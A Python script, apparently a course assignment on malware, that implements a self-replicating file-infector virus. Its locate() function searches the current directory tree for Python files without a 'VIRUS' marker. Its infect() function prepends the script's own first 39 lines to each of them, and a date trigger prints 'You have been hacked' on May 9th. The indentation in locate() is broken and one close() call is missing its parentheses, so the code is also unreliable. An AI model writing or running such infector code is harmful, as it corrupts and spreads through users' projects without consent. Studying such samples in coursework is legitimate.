#!/usr/bin/python3
# Script Name:                  Ops301d10 - Class 14
# Author:                       Zachariah Woodbridge
# Date of latest revision:      14 Dec 2023
# Purpose:                      Python Malware Analysis
# I only used vscode for this.

# Declaration of imports
import os
import datetime

# Signature to identify infected files
SIGNATURE = "VIRUS"

# Function to recursively locate Python files in the specified path
def locate(path):
  # Makes empty array
  files_targeted = []
  # Checks if the path is a directory
  filelist = os.listdir(path)
  # Iterates through the files in the directory
    for fname in filelist:
        # checks if the file is a directory
        if os.path.isdir(path+"/"+fname):
            # checks if the file is a python file
            files_targeted.extend(locate(path+"/"+fname))
        # checks if the file is a python file
        elif fname[-3:] == ".py":
            # checks if the file is already infected
            infected = False
            # Check if the file is already infected by searching for the signature
            for line in open(path+"/"+fname):
            # checks if the signature is found
            if SIGNATURE in line:
                # if the signature is found, the file is already infected
                infected = True
                # break out of the loop
                break
      # If the file is not infected, add it to the list of files to be targeted
      if infected == False:
        # add the file to the list
        files_targeted.append(path+"/"+fname)
    # return the list of files
    return files_targeted

# Function to infect files by adding the virus code to the original content
def infect(files_targeted):
    # Open the virus file
    virus = open(os.path.abspath(__file__))
    # Create an empty string
    virusstring = ""
    # Read the first 39 lines of the virus file and store them in the virusstring
    for i, line in enumerate(virus):
        # Check if the line is less than 39
        if 0 <= i < 39:
            # Add the line to the virusstring
            virusstring += line
    # Close the virus file
    virus.close
    # Iterate through the targeted files, read their content, prepend virus code, and rewrite the file
    for fname in files_targeted:
        # Open the file
        f = open(fname)
        # Read the content of the file
        temp = f.read()
        # Close the file
        f.close()
        # adds the virus code to the beginning of the file
        f = open(fname,"w")
        # Write the content of the file with the virus code
        f.write(virusstring + temp)
        # Close the file
        f.close()

# Function to check the current date and print a message if it's May 9th
def detonate():
    # Check the current date
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # Print a message
        print("You have been hacked")

# Locate Python files in the current directory and its subdirectories
files_targeted = locate(os.path.abspath(""))

# Infect the targeted files with the virus code
infect(files_targeted)

# Check the date and print a message if it's May 9th
detonate()
